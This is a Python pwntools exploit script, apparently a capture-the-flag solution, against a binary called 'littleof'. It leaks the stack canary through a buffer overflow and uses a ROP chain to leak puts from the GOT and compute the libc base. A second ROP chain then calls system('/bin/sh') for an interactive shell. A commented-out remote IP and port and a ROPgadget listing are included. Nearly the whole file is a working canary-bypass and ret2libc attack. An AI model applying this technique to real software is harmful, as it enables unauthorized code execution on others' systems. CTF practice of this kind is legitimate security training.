from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])

io=process("./littleof")
# io=remote("1.14.71.254",28258)
elf=ELF("./littleof")
libc=ELF("./libc-2.27.so") #libc6_2.27-3ubuntu1.4_amd64

ret_addr=0x40059e
pop_rdi_addr=0x400863
# start_addr=elf.sym[b"__libc_start_main"]
start_addr=0x400789
puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]


gdb.attach(io)
pause()

payload=b"a"*0x48
io.recvuntil(b"\n")
io.sendline(payload)
io.recvuntil(b"a\n")
canary=u64(io.recv(7).rjust(8,b"\x00"))
print("canary:  "+hex(canary))


payload=cyclic(0x48)+p64(canary)+p64(0)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
io.sendline(payload)
# libc_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))-libc.sym[b"puts"]
io.recvuntil(b'I hope you win\n')
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
libc_addr=leak_addr-0x080aa0
print("leak_addr:  "+hex(leak_addr))
print("puts_offset:  "+hex(libc.sym[b"puts"]))
print("bin_offset:  "+hex(next(libc.search(b"/bin/sh"))))
print("libc_addr:  "+hex(libc_addr)+"     "+hex(libc_addr+libc.sym[b"puts"]))


# sys_addr=libc_addr+libc.sym[b"system"]
sys_addr=libc_addr+0x04f550
# bin_addr=libc_addr+next(libc.search(b"/bin/sh"))
bin_addr=libc_addr+0x1b3e1a
payload=cyclic(0x48)+p64(canary)+p64(0)+p64(ret_addr)+p64(pop_rdi_addr)+p64(bin_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040085c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040085e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400860 : pop r14 ; pop r15 ; ret
# 0x0000000000400862 : pop r15 ; ret
# 0x000000000040085b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040085f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006c9 : pop rbp ; ret
# 0x0000000000400863 : pop rdi ; ret
# 0x0000000000400861 : pop rsi ; pop r15 ; ret
# 0x000000000040085d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040059e : ret
# 0x000000000040070e : ret 0x8b48

# Unique gadgets found: 12